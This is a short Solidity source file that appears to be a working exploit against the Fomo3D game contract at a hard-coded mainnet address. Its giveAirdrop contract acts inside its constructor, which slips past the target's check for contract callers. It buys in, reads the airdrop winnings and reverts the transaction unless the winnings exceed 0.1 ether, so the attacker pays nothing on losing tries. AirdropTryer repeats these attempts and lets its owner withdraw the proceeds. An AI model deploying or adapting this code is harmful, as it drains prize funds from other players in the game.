1 pragma solidity ^0.4.6;
2 pragma solidity ^0.4.24;
3 
4 contract fomo3d {
5     function getPlayerInfoByAddress(address _addr)
6         public 
7         view 
8         returns(uint256, bytes32, uint256, uint256, uint256, uint256, uint256);
9         
10     function withdraw()
11         public;
12         
13 }
14 
15 contract giveAirdrop {
16 
17     constructor () public payable {
18         // Instantiate fomo3d contract
19         fomo3d fomo = fomo3d(address(0xA62142888ABa8370742bE823c1782D17A0389Da1));
20         
21         // Buy in
22         require(address(0xA62142888ABa8370742bE823c1782D17A0389Da1).call.value(msg.value)());
23         
24         // Check to see if we won an airdrop
25         (,,,uint winnings,,,) = fomo.getPlayerInfoByAddress(address(this));
26         require(winnings > 0.1 ether);
27         fomo.withdraw();
28         
29         selfdestruct(msg.sender);
30     }
31     
32     // Accept ETH
33     function () public payable {}
34 }
35 
36 contract AirdropTryer {
37 
38   address owner;
39   giveAirdrop airdropper;
40 
41 
42   constructor () public {
43     owner = msg.sender;
44   }
45 
46   function tryAirdrop() public payable{
47     airdropper = (new giveAirdrop).value(msg.value)();
48   }
49   
50   function empty() public {
51       require(msg.sender == owner);
52       selfdestruct(owner);
53   }
54 }